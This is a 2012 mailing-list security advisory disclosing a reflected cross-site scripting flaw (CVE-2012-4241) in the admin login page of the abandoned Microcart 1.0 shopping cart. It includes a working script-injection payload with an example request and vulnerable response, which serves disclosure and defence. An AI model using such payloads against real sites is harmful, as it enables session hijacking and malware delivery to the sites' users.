
Date: Wed, 19 Sep 2012 15:27:55 +0100
From: "Joseph Sheridan" <joe@...ctionis.com>
To: "'full-disclosure'" <full-disclosure@...ts.grok.org.uk>,
	"'bugtraq'" <bugtraq@...urityfocus.com>, <secalert@...urityreason.com>,
	<bugs@...uritytracker.com>, "'vuln'" <vuln@...unia.com>,
	<vuln@...urity.nnov.ru>, <news@...uriteam.com>, <moderators@...db.org>,
	<submissions@...ketstormsecurity.org>, <submit@...ecurity.com>
Subject: Microcart 1.0 _Admin Cross-Site Scripting
	Security Vulnerability

/-----------------------------------------------------------------\
| Microcart 1.0 _Admin Cross-Site Scripting Security Vulnerability |
\-----------------------------------------------------------------/


Summary
=======

Microcart 1.0 is subject to a cross-site scripting vulnerability. A generic parameter on the /_admin/index.php page was found to be subject to a cross-site scripting vulnerability. It was possible to inject arbitrary Javascript into the URL via the query string or following a ‘/’ character. This code is then passed into a form action parameter without sanitisation, and executed by the browser. Injecting the following Javascript code into a generic parameter on the /_admin/index.php page will trigger the vulnerability, causing the page to return a Javascript alert box.

CVE number: CVE-2012-4241
Impact: Medium
Vendor homepage: http://microcart.sourceforge.net/
Vendor notified: 23/07/2012
Vendor resonse: This package is no longer being maintained and has subsequently been removed from sourceforge.net
Credit: Chris Cooper and Joseph Sheridan of ReactionIS (http://www.reactionis.co.uk/)

This advisory is posted at:

http://www.reactionpenetrationtesting.co.uk/microcart-_admin-xss.html


Affected Products
======== ========

Microcart 1.0.


Details
=======


/_admin/index.php
-----------------

A generic parameter on the /_admin/index.php page was found to be subject to a cross-site scripting vulnerability. It was possible to inject arbitrary Javascript into the URL via the query string or following a ‘/’ character. This code is then passed into a form action parameter without sanitisation, and executed by the browser.

Injecting the following Javascript code into a generic parameter on the /_admin/index.php page will trigger the vulnerability, causing the page to return a Javascript alert box.

"><script>alert('xsstest')</script>

Example Request:

GET /microcart/_admin/index.php/"><script>alert('xsstest')</script> HTTP/1.1
Host: 192.168.0.6
Referer: https://192.168.0.6/microcart/_admin/

Example Response:

--- SNIP ---
     <div id="main">
<h2>Login</h2>
           <p>Please enter your credentials to continue.</p>
           <form action="/microcart/_admin/index.php/"><script>alert('xsstest')</script>" method="post">       <table>
                     <tr><th>Username:</th><td><input type="text" name="username" /></td></tr>
                     <tr><th>Password:</th><td><input type="password" name="password" /></td></tr>
                     <tr><td colspan="2"><input type="submit" name="login" value="Login" /></td></tr>
                </table>
           </form>    </div>
--- SNIP ---



Impact
======

An attacker might entice users to follow a malicious URL, or visit a malicious page that submits arbitrary code to a Microcart application. If they do so, Javascript code might execute in their browser, potentially stealing session cookies or downloading malware onto their machine.


Solution
========

The affected product is not under active development and, at the time of writing, no patch has been released by the vendor.


Distribution
============

In addition to posting on the website, a text version of this notice has been posted to the following e-mail and Usenet news recipients.

* bugtraq () securityfocus com
* full-disclosure () lists grok org uk

Future updates of this advisory, if any, will be placed on the ReactionIS corporate website, but may or may not be actively announced on mailing lists or newsgroups. Users concerned about this problem are encouraged to check the URL below for any updates:


http://www.reactionpenetrationtesting.co.uk/microcart-_admin-xss.html

==============================================================================

Reaction Information Security 
Lombard House Business Centre,
Suite 117,
12-17 Upper Bridge Street,
Canterbury, Kent, CT1 2NF

Phone: +44 (0)1227 785050
Email: research () reactionis {dot} co {dot} uk
Web: http://www.reactionpenetrationtesting.co.uk


Joseph Sheridan
Director
CHECK Team Leader, CREST Infrastructure, CREST Application, CISSP
Tel: 07812052515
Web: www.reactionis.com
Email: joe@...ctionis.co.uk

Reaction Information Security Limited.
Registered in England No: 6929383
Registered Office: 1, The Mews, 69 New Dover Road, Canterbury, CT1 3DZ
 
This email and any files transmitted with it are confidential and are intended solely for the use of the individual to whom they are addressed. If you are not the intended recipient please notify the sender. Any unauthorised dissemination or copying of this email or its attachments and any use or disclosure of any information contained in them, is strictly prohibited.

 Please consider the environment before printing this email



_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/